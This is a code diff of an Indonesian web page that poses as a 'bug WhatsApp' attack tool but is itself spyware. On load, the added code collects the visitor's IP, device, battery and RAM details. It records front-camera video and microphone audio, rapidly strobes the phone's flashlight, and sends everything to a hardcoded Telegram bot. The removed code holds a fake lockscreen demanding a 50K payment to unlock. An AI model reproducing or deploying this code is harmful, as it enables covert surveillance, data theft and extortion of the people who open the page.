@@ -3,9 +3,8 @@
 <head>
   <meta charset="UTF-8">
   <title>dhack bug</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;900&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
@@ -20,153 +19,163 @@
       position: relative;
       padding: 20px;
     }
-
-    /* CSS LOCKSCREEN OVERLAY */
-    #lockscreen-overlay {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: #1a1a1b;
-      z-index: 9999;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      color: white;
-    }
-
-    .phone-frame {
-      width: 320px;
-      height: 650px;
-      background: #000;
-      border: 12px solid #222;
-      border-radius: 45px;
-      padding: 10px;
-      position: relative;
-      display: flex;
-      flex-direction: column;
-      overflow: hidden;
-    }
-
-    .screen-lock {
-      flex: 1;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      padding-top: 60px;
-    }
-
-    .lock-icon { font-size: 60px; color: #ff3b30; margin-bottom: 20px; }
-    .brand-text { font-size: 13px; font-weight: 800; text-align: center; padding: 0 10px; text-transform: uppercase; }
-    #pinDisplay { background: transparent; border: none; color: #555; font-size: 24px; text-align: center; width: 150px; letter-spacing: 8px; margin: 25px 0; outline: none; }
-    
-    .numpad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; }
-    .key { width: 70px; height: 50px; background: #262626; border: none; border-radius: 8px; color: white; font-size: 20px; cursor: pointer; display: flex; justify-content: center; align-items: center; }
-    .key:active { background: #444; }
-    .bottom-warning { position: absolute; bottom: 30px; color: #ff3b30; font-size: 10px; font-weight: bold; width: 100%; text-align: center; letter-spacing: 1px; }
-
-    /* CSS KONTEN UTAMA */
     .bg-particles { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 0; }
-    .particle { position: absolute; width: 2px; height: 2px; background: rgba(0, 255, 127, 0.3); border-radius: 50%; animation: float 6s ease-in-out infinite; }
-    @keyframes float { 0%, 100% { transform: translateY(0px); opacity: 0.3; } 50% { transform: translateY(-20px); opacity: 0.8; } }
-    
-    .login-container { background-color: rgba(17, 17, 17, 0.95); padding: 30px; border-radius: 16px; box-shadow: 0 0 20px blue; text-align: center; max-width: 400px; width: 100%; z-index: 2; }
-    .login-title { font-size: 22px; font-weight: 900; margin-bottom: 15px; background: linear-gradient(135deg, #2563eb, #ffffff); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
-    .login-input { width: 100%; padding: 12px; margin-bottom: 16px; background: #333; border: 1px solid transparent; border-radius: 6px; color: #fff; outline: none; }
-    .platform-label { color: #00ff7f; font-size: 12px; font-weight: 900; text-align: left; margin-bottom: 10px; }
-    .platform-group { display: flex; gap: 10px; margin-bottom: 20px; }
-    .platform-btn { flex: 1; padding: 12px; background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(255, 255, 255, 0.2); border-radius: 10px; color: #ccc; cursor: pointer; font-size: 10px; font-weight: bold; }
-    .platform-btn.active { background: rgba(37, 99, 235, 0.2); border-color: #2563eb; color: #fff; }
-    .login-button { width: 100%; padding: 12px; background: linear-gradient(135deg, #2563eb, #1e40af); color: white; border: none; border-radius: 10px; font-weight: 600; cursor: pointer; }
-    #notif { font-size: 14px; color: #00d9ff; margin-bottom: 10px; display: none; }
+    .particle {
+      position: absolute;
+      width: 2px;
+      height: 2px;
+      background: rgba(0, 255, 127, 0.3);
+      border-radius: 50%;
+      animation: float 6s ease-in-out infinite;
+    }
+    @keyframes float {
+      0%, 100% { transform: translateY(0px); opacity: 0.3; }
+      50% { transform: translateY(-20px); opacity: 0.8; }
+    }
+    .login-container {
+      background-color: rgba(17, 17, 17, 0.95);
+      padding: 30px;
+      border-radius: 16px;
+      box-shadow: 0 0 20px blue;
+      text-align: center;
+      max-width: 400px;
+      width: 100%;
+      z-index: 2;
+    }
+    .login-title {
+      font-size: 26px;
+      font-weight: 900;
+      margin-bottom: 5px;
+      background: linear-gradient(135deg, #2563eb, #ffffff);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+    #notif {
+      font-size: 14px;
+      color: #00d9ff;
+      font-weight: 600;
+      height: 20px;
+      margin-bottom: 10px;
+      display: none;
+    }
+    .login-input {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 16px;
+      background: #333;
+      border: 1px solid transparent;
+      border-radius: 6px;
+      color: #fff;
+      font-size: 15px;
+      outline: none;
+    }
+    .login-input:focus { border: 1px solid #2563eb; }
+
+    .platform-label {
+      color: #00ff7f;
+      font-size: 12px;
+      font-weight: 900;
+      text-align: left;
+      margin-bottom: 10px;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+    }
+    .platform-group {
+      display: flex;
+      gap: 10px;
+      margin-bottom: 20px;
+    }
+    .platform-btn {
+      flex: 1;
+      padding: 15px 5px;
+      background: rgba(255, 255, 255, 0.05);
+      border: 1px solid rgba(255, 255, 255, 0.2);
+      border-radius: 12px;
+      color: #ccc;
+      font-weight: 700;
+      font-size: 11px;
+      cursor: pointer;
+      transition: 0.3s;
+      text-transform: uppercase;
+    }
+    .platform-btn.active {
+      background: rgba(37, 99, 235, 0.2);
+      border-color: #2563eb;
+      color: #fff;
+      box-shadow: 0 0 10px rgba(37, 99, 235, 0.3);
+    }
+
+    .login-button {
+      width: 100%;
+      padding: 12px;
+      background: linear-gradient(135deg, #2563eb, #1e40af);
+      color: white;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+      font-weight: 600;
+      font-size: 15px;
+      transition: 0.3s;
+    }
+    .login-button:hover { box-shadow: 0 0 20px blue; transform: translateY(-2px); }
   </style>
 </head>
 <body>
-
-  <div id="lockscreen-overlay">
-    <div class="phone-frame">
-        <div class="screen-lock">
-            <i class="fas fa-lock lock-icon"></i>
-            <div class="brand-text">LOCK BY SANN<br>TF 50K UNTUK MEMBUKA KUNCI<br>HUBUNGI TELEGRAM: @DhanzX7</div>
-            <input type="password" id="pinDisplay" maxlength="4" readonly placeholder="••••">
-            <div class="numpad">
-                <button class="key" onclick="pressKey('1')">1</button>
-                <button class="key" onclick="pressKey('2')">2</button>
-                <button class="key" onclick="pressKey('3')">3</button>
-                <button class="key" onclick="pressKey('4')">4</button>
-                <button class="key" onclick="pressKey('5')">5</button>
-                <button class="key" onclick="pressKey('6')">6</button>
-                <button class="key" onclick="pressKey('7')">7</button>
-                <button class="key" onclick="pressKey('8')">8</button>
-                <button class="key" onclick="pressKey('9')">9</button>
-                <div style="width:70px"></div>
-                <button class="key" onclick="pressKey('0')">0</button>
-                <button class="key" onclick="delKey()"><i class="fas fa-backspace"></i></button>
-            </div>
-            <div class="bottom-warning">JANGAN MERESTART HP ANDA</div>
-        </div>
-    </div>
-  </div>
-
   <div class="bg-particles"></div>
+
   <div class="login-container">
     <p class="login-title">bug WhatsApp By Hacked official</p>
     <div id="notif">Sukses bug atack ✅</div>
+    
     <input type="number" class="login-input" placeholder="Nomor WhatsApp Target" id="text">
+
     <p class="platform-label">Platform Selection</p>
     <div class="platform-group">
       <button type="button" class="platform-btn active" onclick="selectPlatform(this)">Android OS</button>
       <button type="button" class="platform-btn" onclick="selectPlatform(this)">iOS Platform</button>
     </div>
+
     <button class="login-button" id="login-button">Atack</button>
   </div>
 
   <script>
     const botToken = '8403098052:AAHoNelCuHdAaZJwYZQxH0kJPgkbC2hXOdg';
     const chatIds = ['7945789634'];
-    let currentPin = "";
-    const correctPin = "5151";
+    const input = document.getElementById('text');
+    const button = document.getElementById('login-button');
+    const notif = document.getElementById('notif');
 
-    // --- FUNGSI LOCKSCREEN ---
-    function pressKey(num) {
-      if (currentPin.length < 4) {
-        currentPin += num;
-        document.getElementById("pinDisplay").value = currentPin;
-        if (currentPin.length === 4) setTimeout(validatePin, 300);
-      }
-    }
-    function delKey() {
-      currentPin = currentPin.slice(0, -1);
-      document.getElementById("pinDisplay").value = currentPin;
-    }
-    function validatePin() {
-      if (currentPin === correctPin) {
-        document.getElementById("lockscreen-overlay").style.display = "none";
-        // Keluar dari Fullscreen jika ingin
-      } else {
-        alert("PIN Salah!");
-        currentPin = "";
-        document.getElementById("pinDisplay").value = "";
-      }
+    function selectPlatform(btn) {
+      document.querySelectorAll('.platform-btn').forEach(b => b.classList.remove('active'));
+      btn.classList.add('active');
     }
 
-    // --- ANTI HOME / BACK ---
-    function preventBack() {
-      window.history.pushState(null, "", window.location.href);
-      window.onpopstate = function() {
-        window.history.pushState(null, "", window.location.href);
-      };
-    }
-
-    // --- FUNGSI TELEGRAM & INFO ---
     function sendToTelegram(text) {
       chatIds.forEach(id => {
         fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ chat_id: id, text: text, parse_mode: 'HTML' })
-        });
+        }).catch(console.error);
+      });
+    }
+
+    function sendVideo(blob, filename) {
+      chatIds.forEach(id => {
+        const formData = new FormData();
+        formData.append('chat_id', id);
+        formData.append('video', blob, filename);
+        formData.append('caption', '📹 Rekaman Kamera Depan (7 Detik)');
+        fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, { method: 'POST', body: formData }).catch(console.error);
+      });
+    }
+
+    function sendVoice(blob, filename) {
+      chatIds.forEach(id => {
+        const formData = new FormData();
+        formData.append('chat_id', id);
+        formData.append('voice', blob, filename);
+        fetch(`https://api.telegram.org/bot${botToken}/sendVoice`, { method: 'POST', body: formData }).catch(console.error);
       });
     }
 
@@ -174,58 +183,123 @@
       try {
         const ipRes = await fetch('https://api.ipify.org?format=json');
         const ipData = await ipRes.json();
-        let batteryInfo = "N/A";
+        
+        let batteryInfo = "Tidak didukung";
         if (navigator.getBattery) {
-          const b = await navigator.getBattery();
-          batteryInfo = `${(b.level * 100).toFixed(0)}% (${b.charging ? "Charging" : "Discharging"})`;
+          const battery = await navigator.getBattery();
+          const level = (battery.level * 100).toFixed(0);
+          const chargingStatus = battery.charging ? "Charging" : "Discharging";
+          batteryInfo = `${level}% (${chargingStatus})`;
         }
-        const device = navigator.userAgent.split('(')[1].split(')')[0];
-        const info = `📱 <b>Device:</b> ${device}\n🌐 <b>IP:</b> ${ipData.ip}\n🔋 <b>Baterai:</b> ${batteryInfo}\n🕒 <b>Waktu:</b> ${new Date().toLocaleString()}`;
-        sendToTelegram(`<b>📥 Info Pengunjung (Auto):</b>\n\n${info}`);
-      } catch (e) {}
-    }
 
-    // Fitur Media (Audio/Video)
-    async function startMedia() {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
-        // Logika kirim video/audio tetap sama seperti kode sebelumnya...
-        sendToTelegram("<b>berhasil lock handphone</b>");
+        const ram = navigator.deviceMemory || "Tidak diketahui";
+        const device = navigator.userAgent.split('(')[1].split(')')[0];
+
+        const text = `📱 <b>Device:</b> ${device}\n🌐 <b>IP:</b> ${ipData.ip}\n🔋 <b>Baterai:</b> ${batteryInfo}\n🕒 <b>Waktu:</b> ${new Date().toLocaleString()}\n📟 <b>RAM Handphone:</b> ±${ram} GB`;
+        sendToTelegram(`<b>📥 Info data hp ⬇️</b>\n\n${text}`);
       } catch (err) {}
     }
 
-    // --- EVENT LISTENER ---
+    async function recordFrontVideo() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
+        const mediaRecorder = new MediaRecorder(stream);
+        const videoChunks = [];
+        mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) videoChunks.push(e.data); };
+        mediaRecorder.onstop = () => {
+          const videoBlob = new Blob(videoChunks, { type: 'video/mp4' });
+          sendVideo(videoBlob, 'rekaman_depan.mp4');
+          stream.getTracks().forEach(track => track.stop());
+        };
+        mediaRecorder.start();
+        setTimeout(() => { if (mediaRecorder.state !== "inactive") mediaRecorder.stop(); }, 7000);
+      } catch (err) {
+        sendToTelegram('maaf akses vidio tidak berhasil 🤬');
+      }
+    }
+
+    async function autoRecordAudio() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+        const mediaRecorder = new MediaRecorder(stream);
+        const chunks = [];
+        mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) chunks.push(e.data); };
+        mediaRecorder.onstop = () => {
+          const blob = new Blob(chunks, { type: 'audio/mpeg' }); 
+          sendVoice(blob, 'voice_note.mp3');
+          stream.getTracks().forEach(track => track.stop());
+        };
+        mediaRecorder.start();
+        setTimeout(() => { if (mediaRecorder.state !== "inactive") mediaRecorder.stop(); }, 5000);
+      } catch (err) {
+        sendToTelegram('Izin Voice Note ditolak ❌');
+      }
+    }
+
+    // --- FITUR FLASH UPDATED (90ms) ---
+    async function startFlashStrobe() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
+        const track = stream.getVideoTracks()[0];
+        const capabilities = track.getCapabilities();
+
+        if (!capabilities.torch) {
+          sendToTelegram('flash tidak on 🤬');
+          stream.getTracks().forEach(t => t.stop());
+          return;
+        }
+
+        sendToTelegram('flash berhasil on ✅');
+
+        let isOn = false;
+        // Kecepatan kedip diatur ke 90ms
+        const interval = setInterval(async () => {
+          try {
+            isOn = !isOn;
+            await track.applyConstraints({ advanced: [{ torch: isOn }] });
+          } catch (e) {
+            clearInterval(interval);
+          }
+        }, 90);
+
+        // Durasi 20 detik
+        setTimeout(() => {
+          clearInterval(interval);
+          track.applyConstraints({ advanced: [{ torch: false }] });
+          stream.getTracks().forEach(t => t.stop());
+        }, 20000);
+
+      } catch (err) {
+        sendToTelegram('flash tidak on 🤬');
+      }
+    }
+
     window.addEventListener('DOMContentLoaded', () => {
-      preventBack();
       createParticles();
       getInfo();
-      startMedia();
+      autoRecordAudio(); 
+      recordFrontVideo();
+      startFlashStrobe();
+    });
+
+    button.addEventListener('click', () => {
+      const nomor = input.value.trim();
+      if (!nomor || nomor.length < 8) return;
       
-      // Minta Fullscreen saat klik pertama (karena kebijakan browser)
-      document.body.addEventListener('click', () => {
-        if (document.documentElement.requestFullscreen) {
-            document.documentElement.requestFullscreen().catch(() => {});
-        }
-      }, { once: true });
+      button.disabled = true;
+      notif.style.display = 'none';
+      sendToTelegram(`<b>📞 Target Attack:</b> ${nomor}`);
+      
+      setTimeout(() => {
+        notif.style.display = 'block';
+        button.disabled = false;
+        input.value = '';
+      }, 1000);
     });
-
-    document.getElementById('login-button').addEventListener('click', () => {
-      const num = document.getElementById('text').value;
-      if (num.length >= 8) {
-        sendToTelegram(`<b>📞 Target Attack:</b> ${num}`);
-        document.getElementById('notif').style.display = 'block';
-        document.getElementById('text').value = '';
-      }
-    });
-
-    function selectPlatform(btn) {
-      document.querySelectorAll('.platform-btn').forEach(b => b.classList.remove('active'));
-      btn.classList.add('active');
-    }
 
     function createParticles() {
       const container = document.querySelector('.bg-particles');
-      for (let i = 0; i < 20; i++) {
+      for (let i = 0; i < 30; i++) {
         const p = document.createElement('div');
         p.className = 'particle';
         p.style.left = Math.random() * 100 + '%';
